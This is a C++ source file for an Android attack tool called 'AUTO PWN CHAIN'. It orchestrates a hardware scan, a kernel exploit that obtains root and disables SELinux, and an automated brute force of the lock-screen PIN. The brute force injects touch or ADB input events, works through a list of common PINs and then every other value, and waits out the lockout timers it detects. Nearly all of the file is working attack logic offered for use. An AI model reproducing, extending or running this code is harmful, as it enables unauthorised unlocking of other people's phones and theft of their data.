#include "auto_pwn_chain.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <algorithm>
#include <set>

AutoPwnChain::AutoPwnChain()
    : kernel_(), hw_(), pin_(), scanner_(), soc_(), tz_(), config_(), hw_info_(), results_() {
    config_.pin_length = 4;
    config_.inter_digit_us = 80000;
    config_.batch_size = 100;
    config_.max_attempts = 10000;
    config_.use_touch = 1;
    config_.use_sendevent = 0;
    config_.use_keyevent = 0;
    config_.use_gpio = 0;
    config_.grid_x = 0;
    config_.grid_y = 0;
    config_.key_w = 0;
    config_.key_h = 0;
    config_.screen_w = 1080;
    config_.screen_h = 1920;
}

AutoPwnChain::~AutoPwnChain() {}

int AutoPwnChain::run_full_chain() {
    printf("\n" BOLD GREEN "========== AUTO PWN CHAIN v2.0 ==========" RESET "\n\n");
    results_.clear();

    if (!run_phase(PWN_PHASE_SCAN)) return 0;
    if (!run_phase(PWN_PHASE_KERNEL)) { }
    if (!run_phase(PWN_PHASE_HARDWARE)) { }
    if (!run_phase(PWN_PHASE_BYPASS)) { }
    if (!run_phase(PWN_PHASE_BRUTE)) return 0;
    run_phase(PWN_PHASE_CLEANUP);

    print_chain_summary();
    return 1;
}

int AutoPwnChain::run_phase(PwnPhase phase) {
    switch (phase) {
        case PWN_PHASE_SCAN: return run_scan_phase();
        case PWN_PHASE_KERNEL: return run_kernel_phase();
        case PWN_PHASE_HARDWARE: return run_hardware_phase();
        case PWN_PHASE_BYPASS: return run_bypass_phase();
        case PWN_PHASE_BRUTE: return run_brute_phase();
        case PWN_PHASE_CLEANUP: return run_cleanup_phase();
        default: return 0;
    }
}

int AutoPwnChain::run_scan_phase() {
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    printf("[*] " BOLD "Phase 1: Deep Hardware Scan" RESET "\n");

    scanner_.scan_all(&hw_info_);
    scanner_.print_deep_info(&hw_info_);

    hw_.init();
    hw_.scan_all_components();
    pin_.init();

    SocInfo soc;
    soc_ = *(scanner_.get_soc_engine());
    soc_.detect_soc(&soc);
    soc_.print_soc_info();
    soc_.print_vulnerabilities();

    TrustZoneInfo tz;
    tz_ = *(scanner_.get_tz_pwn());
    tz_.detect_trustzone(&tz);
    tz_.print_trustzone_info();

    clock_gettime(CLOCK_MONOTONIC, &end);
    int elapsed = (int)((end.tv_sec - start.tv_sec) * 1000 +
                        (end.tv_nsec - start.tv_nsec) / 1000000);
    add_result(PWN_PHASE_SCAN, "Deep Hardware Scan", 1, elapsed,
               hw_info_.soc_vendor + " " + hw_info_.soc_model);
    printf(GREEN "[+] Phase 1 complete (%d ms)\n" RESET, elapsed);
    return 1;
}

int AutoPwnChain::run_kernel_phase() {
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    printf("\n[*] " BOLD "Phase 2: Kernel Exploitation" RESET "\n");

    kernel_.scan_available_exploits();
    int result = kernel_.auto_exploit();
    if (result) {
        printf(GREEN "[+] Root obtained via kernel exploit!\n" RESET);
        if (kernel_.disable_selinux())
            printf(GREEN "[+] SELinux disabled!\n" RESET);
    } else {
        printf(YELLOW "[-] Kernel exploit failed\n" RESET);
    }

    clock_gettime(CLOCK_MONOTONIC, &end);
    int elapsed = (int)((end.tv_sec - start.tv_sec) * 1000 +
                        (end.tv_nsec - start.tv_nsec) / 1000000);
    add_result(PWN_PHASE_KERNEL, "Kernel Exploit", result, elapsed,
               kernel_.is_root() ? "Root" : "Failed");
    return result;
}

int AutoPwnChain::run_hardware_phase() {
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    printf("\n[*] " BOLD "Phase 3: Hardware Control" RESET "\n");

    hw_.print_all_components();

    int w = 0, h = 0, bpp = 0;
    if (hw_.display_get_info(&w, &h, &bpp)) {
        config_.screen_w = w;
        config_.screen_h = h;
        printf("[*] Display: %dx%d %dbpp\n", w, h, bpp);
    }

    if (hw_.is_component_available(HW_TOUCH)) {
        printf(GREEN "[+] Touch controller available\n" RESET);
        config_.use_touch = 1;
    } else if (hw_.is_component_available(HW_GPIO)) {
        printf(YELLOW "[*] Using GPIO button control\n" RESET);
        config_.use_gpio = 1;
    } else {
        printf(YELLOW "[*] Using sendevent method\n" RESET);
        config_.use_sendevent = 1;
    }

    clock_gettime(CLOCK_MONOTONIC, &end);
    int elapsed = (int)((end.tv_sec - start.tv_sec) * 1000 +
                        (end.tv_nsec - start.tv_nsec) / 1000000);
    add_result(PWN_PHASE_HARDWARE, "Hardware Control", 1, elapsed, "");
    printf(GREEN "[+] Phase 3 complete (%d ms)\n" RESET, elapsed);
    return 1;
}

int AutoPwnChain::run_bypass_phase() {
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    printf("\n[*] " BOLD "Phase 4: Lock Screen Bypass Attempt" RESET "\n");

    if (pin_.wake_screen()) {
        printf("[*] Screen woken\n");
    }

    pin_.swipe_unlock();
    usleep(500000);

    int unlocked = pin_.is_unlocked();
    if (unlocked) {
        printf(GREEN "[+] Device already unlocked!\n" RESET);
    } else {
        printf(YELLOW "[-] Device locked, proceeding to brute force\n" RESET);
    }

    if (!select_pin_length()) return 0;
    if (!select_pin_grid()) return 0;
    if (!select_input_method()) return 0;

    clock_gettime(CLOCK_MONOTONIC, &end);
    int elapsed = (int)((end.tv_sec - start.tv_sec) * 1000 +
                        (end.tv_nsec - start.tv_nsec) / 1000000);
    add_result(PWN_PHASE_BYPASS, "Bypass Attempt", unlocked, elapsed,
               unlocked ? "Unlocked" : "Locked");
    return 1;
}

int AutoPwnChain::run_brute_phase() {
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    printf("\n[*] " BOLD "Phase 5: PIN Brute Force" RESET "\n");

    PinKeyboardLayout layout;
    pin_.detect_keyboard_layout(&layout);
    pin_.print_layout(&layout);

    printf("[*] PIN length: %d-digit\n", config_.pin_length);
    printf("[*] Grid: (%d,%d) keys %dx%d\n", config_.grid_x, config_.grid_y,
           config_.key_w, config_.key_h);

    std::vector<std::string> pins;
    generate_pin_list(pins, &config_);
    printf("[*] Generated %zu unique PIN candidates\n", pins.size());

    pin_.set_speed(config_.inter_digit_us);
    pin_.set_grid(config_.grid_x, config_.grid_y, config_.key_w, config_.key_h);
    pin_.set_screen_size(config_.screen_w, config_.screen_h);

    int found = run_brute_loop(pins, &config_);

    clock_gettime(CLOCK_MONOTONIC, &end);
    int elapsed = (int)((end.tv_sec - start.tv_sec) * 1000 +
                        (end.tv_nsec - start.tv_nsec) / 1000000);
    add_result(PWN_PHASE_BRUTE, "PIN Brute Force", found, elapsed,
               found ? "PIN FOUND" : "Exhausted");
    return found;
}

int AutoPwnChain::run_cleanup_phase() {
    printf("\n[*] " BOLD "Phase 6: Cleanup" RESET "\n");
    kd_fix_security(kernel_.get_kernel_direct());
    kd_restore(kernel_.get_kernel_direct());
    add_result(PWN_PHASE_CLEANUP, "Cleanup", 1, 0, "Done");
    printf(GREEN "[+] Cleanup complete\n" RESET);
    return 1;
}

int AutoPwnChain::select_pin_length() {
    char buf[1024];
    if (adb_native_shell("settings get secure lockscreen.password_type 2>/dev/null",
                         buf, sizeof(buf)) == 0) {
        trim_newline(buf);
        int pt = atoi(buf);
        if (pt == 327680) config_.pin_length = 6;
        else if (pt == 65536) config_.pin_length = 4;
        else if (pt == 131072) config_.pin_length = 4;
    }

    printf("\n[?] Select PIN length:\n");
    printf("  [1] 4-digit PIN (10,000 combos)\n");
    printf("  [2] 6-digit PIN (1,000,000 combos)\n");
    printf("  [3] 8-digit PIN (100,000,000 combos)\n");
    printf("  [4] Custom length\n");
    printf("  [5] Smart auto-detect (%d-digit)\n", config_.pin_length);
    printf("  Choice [5]: ");

    char choice[16];
    if (!fgets(choice, sizeof(choice), stdin)) return 1;
    int c = atoi(choice);
    if (c >= 1 && c <= 4) {
        int lengths[] = {4, 6, 8, 0};
        config_.pin_length = lengths[c-1];
        if (c == 4) {
            printf("  Enter digit count: ");
            if (fgets(choice, sizeof(choice), stdin))
                config_.pin_length = atoi(choice);
        }
    }

    return 1;
}

int AutoPwnChain::select_pin_grid() {
    PinKeyboardLayout layout;
    pin_.detect_keyboard_layout(&layout);
    config_.grid_x = layout.grid_x;
    config_.grid_y = layout.grid_y;
    config_.key_w = layout.key_w;
    config_.key_h = layout.key_h;
    config_.screen_w = layout.screen_w;
    config_.screen_h = layout.screen_h;
    return 1;
}

int AutoPwnChain::select_input_method() {
    printf("\n[?] Select input method:\n");
    printf("  [1] Touch (/dev/input)\n");
    printf("  [2] sendevent (ADB shell) - Fast turbo\n");
    printf("  [3] keyevent (ADB shell) - Simple\n");
    printf("  [4] Auto-select best\n");
    printf("  Choice [4]: ");

    char choice[16];
    if (!fgets(choice, sizeof(choice), stdin)) return 1;
    int c = atoi(choice);
    switch (c) {
        case 1: config_.use_touch = 1; config_.use_sendevent = 0; config_.use_keyevent = 0; break;
        case 2: config_.use_touch = 0; config_.use_sendevent = 1; config_.use_keyevent = 0; break;
        case 3: config_.use_touch = 0; config_.use_sendevent = 0; config_.use_keyevent = 1; break;
        default: break;
    }

    if (config_.use_touch) pin_.set_method(INPUT_METHOD_TOUCH);
    else if (config_.use_sendevent) pin_.set_method(INPUT_METHOD_SENDEVENT);
    else if (config_.use_keyevent) pin_.set_method(INPUT_METHOD_KEYEVENT);
    else if (config_.use_gpio) pin_.set_method(INPUT_METHOD_GPIO_BUTTON);

    return 1;
}

int AutoPwnChain::run_brute_loop(const std::vector<std::string> &pins, BruteConfig *config) {
    PinKeyboardLayout layout;
    pin_.detect_keyboard_layout(&layout);

    pin_.set_speed(config->inter_digit_us);
    pin_.set_grid(config->grid_x, config->grid_y, config->key_w, config->key_h);
    pin_.set_screen_size(config->screen_w, config->screen_h);

    int checked = 0;
    int target = (int)pins.size();
    double avg_response = 200.0;
    int consecutive_ok = 0;

    for (const auto &pin : pins) {
        checked++;
        if (checked % 100 == 0) {
            printf("\r[*] %d/%d PINs tested (%.1f%%) speed: %.0fms",
                   checked, target, checked * 100.0f / target, avg_response);
            fflush(stdout);
        }

        if (checked == 1 || checked % 50 == 0) {
            pin_.wake_screen();
            usleep(300000);
            pin_.swipe_unlock();
            usleep(500000);
        }

        struct timespec t1, t2;
        clock_gettime(CLOCK_MONOTONIC, &t1);

        if (config->use_touch) {
            pin_.enter_pin_touch(pin, &layout);
        } else if (config->use_sendevent) {
            pin_.enter_pin_sendevent(pin, &layout);
        } else {
            pin_.enter_pin_keyevent(pin);
        }

        pin_.press_ok();
        usleep(300000);

        clock_gettime(CLOCK_MONOTONIC, &t2);
        double elapsed_ms = (t2.tv_sec - t1.tv_sec) * 1000.0 +
                            (t2.tv_nsec - t1.tv_nsec) / 1000000.0;

        if (pin_.is_unlocked()) {
            printf("\n\n" BOLD GREEN "[+] PIN FOUND: %s\n" RESET, pin.c_str());
            return 1;
        }

        avg_response = avg_response * 0.7 + elapsed_ms * 0.3;
        if (avg_response > 5000.0) avg_response = 5000.0;
        if (avg_response < 10.0) avg_response = 10.0;

        {
            char buf[256];
            if (adb_native_shell("settings get secure lockscreen.lockoutattemptdeadline 2>/dev/null",
                                 buf, sizeof(buf)) == 0 && strlen(buf) > 0) {
                trim_newline(buf);
                long deadline = atol(buf);
                if (deadline > 0) {
                    long now = 0;
                    struct timespec ts;
                    clock_gettime(CLOCK_REALTIME, &ts);
                    now = ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
                    int remaining = (int)((deadline - now) / 1000);
                    if (remaining > 0) {
                        if (remaining > 120) remaining = 120;
                        printf("\n" YELLOW "[!] LOCKOUT detected! %ds remaining" RESET, remaining);
                        fflush(stdout);
                        for (int w = 0; w < remaining; w++) {
                            printf("."); fflush(stdout);
                            sleep(1);
                        }
                        printf("\n");
                        fflush(stdout);
                        avg_response *= 2.0;
                        if (avg_response > 5000.0) avg_response = 5000.0;
                        continue;
                    }
                }
            }
        }

        if (checked % 10 == 0) {
            double delay_ms = avg_response;
            if (delay_ms > 0) {
                usleep((useconds_t)(delay_ms * 1000.0));
            }
        }

        if (elapsed_ms < 100.0) {
            consecutive_ok++;
            if (consecutive_ok >= 20) {
                avg_response *= 0.95;
                if (avg_response < 1.0) avg_response = 1.0;
            }
        } else {
            consecutive_ok = 0;
        }
    }

    printf("\n[-] PIN not found in list (%d attempted)\n", checked);
    return 0;
}

int AutoPwnChain::generate_pin_list(std::vector<std::string> &pins, BruteConfig *config) {
    int len = config->pin_length;
    int max_pins = config->max_attempts;
    std::set<std::string> seen;

    const char *common[] = {
        "0000", "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999",
        "1234", "4321", "0007", "2001", "1010", "2020", "1212", "1122", "1313", "6969",
        "2580", "0852", "1004", "5683", "1478", "1236", "1239", "1245", "1256", "1269",
        "1345", "1346", "1359", "1470", "1472", "1479", "1480", "1489", "1490", "1590",
        "1592", "1593", "1595", "1596", "1597", "1598", "2365", "2369", "2378", "2389",
        "2468", "2469", "2478", "2489", "2490", "2568", "2569", "2578", "2589", "2678",
        "2689", "2680", "2690", "2789", "2790", "2890", "3456", "3467", "3468", "3478",
        "3489", "3568", "3578", "3589", "3678", "3689", "3690", "3789", "4567", "4568",
        "4569", "4578", "4589", "4678", "4679", "4689", "4789", "5678", "5789", "6789",
        "7890", "8901", "9012", "0123", "1230", "2340", "3450", "4560", "5670", "6780",
        "1998", "1999", "2000", "2002", "2003", "2004", "2005", "2006", "2007", "2008",
        "2009", "2010", "2011", "2012", "2013", "2014", "2015", "2016", "2017", "2018",
        "2019", "2021", "2022", "2023", "2024", "2025", "1986", "1987", "1988", "1989",
        "1990", "1991", "1992", "1993", "1994", "1995", "1996", "1997",
        "1337", "8008", "1331", "7331", "1332", "3733", "3333", "7337",
        NULL
    };

    for (int i = 0; common[i] && (int)pins.size() < max_pins; i++) {
        if ((int)strlen(common[i]) == len) {
            if (seen.insert(common[i]).second)
                pins.push_back(common[i]);
        }
    }

    char pin[16];
    int start = 0;
    int end = 1;
    for (int i = 0; i < len; i++) end *= 10;

    for (int i = start; i < end && (int)pins.size() < max_pins; i++) {
        snprintf(pin, sizeof(pin), "%0*d", len, i);
        if (seen.insert(pin).second)
            pins.push_back(pin);
    }

    return (int)pins.size();
}

int AutoPwnChain::scan_then_brute() {
    run_phase(PWN_PHASE_SCAN);
    run_phase(PWN_PHASE_BYPASS);
    return run_brute_phase();
}

int AutoPwnChain::auto_configure() {
    scanner_.scan_all(&hw_info_);
    select_pin_length();
    select_pin_grid();
    select_input_method();
    return 1;
}

int AutoPwnChain::is_device_ready() {
    char buf[1024];
    if (adb_native_shell("echo ready", buf, sizeof(buf)) != 0) return 0;
    return strstr(buf, "ready") ? 1 : 0;
}

int AutoPwnChain::get_success_count() const {
    int c = 0;
    for (const auto &r : results_)
        if (r.success) c++;
    return c;
}

void AutoPwnChain::add_result(PwnPhase phase, const std::string &name,
                               int success, int duration_ms,
                               const std::string &details) {
    PwnStepResult r;
    r.phase = phase;
    r.phase_name = name;
    r.success = success;
    r.duration_ms = duration_ms;
    r.details = details;
    results_.push_back(r);
}

void AutoPwnChain::print_chain_summary() const {
    printf("\n" BOLD "========== PWN CHAIN SUMMARY ==========" RESET "\n");
    printf("  %-25s %-10s %-10s %s\n", "Phase", "Status", "Time", "Details");
    printf("  " "----------------------------------------" "\n");
    for (const auto &r : results_) {
        printf("  %-25s %s %-6s %-4dms %s\n",
               r.phase_name.c_str(),
               r.success ? GREEN "OK" RESET : RED "FAIL" RESET,
               "", r.duration_ms,
               r.details.c_str());
    }
    printf("  " "----------------------------------------" "\n");
    int total = 0;
    for (const auto &r : results_) total += r.duration_ms;
    printf("  Total: %d ms | %d/%zu phases succeeded\n",
           total, get_success_count(), results_.size());
    printf("============================================\n");
}

void AutoPwnChain::print_brute_config(const BruteConfig *config) const {
    printf("\n" BOLD "=== Brute Force Configuration ===" RESET "\n");
    printf("  PIN Length  : %d-digit\n", config->pin_length);
    printf("  Input Method: %s\n",
           config->use_touch ? "Touch" :
           config->use_sendevent ? "sendevent" :
           config->use_keyevent ? "keyevent" : "GPIO");
    printf("  Grid        : (%d,%d) keys %dx%d\n",
           config->grid_x, config->grid_y, config->key_w, config->key_h);
    printf("  Speed       : %d us/digit\n", config->inter_digit_us);
    printf("  Batch Size  : %d\n", config->batch_size);
    printf("  Max Attempts: %d\n", config->max_attempts);
}

int AutoPwnChain::try_user_selection() {
    (void)0;
    return 0;
}
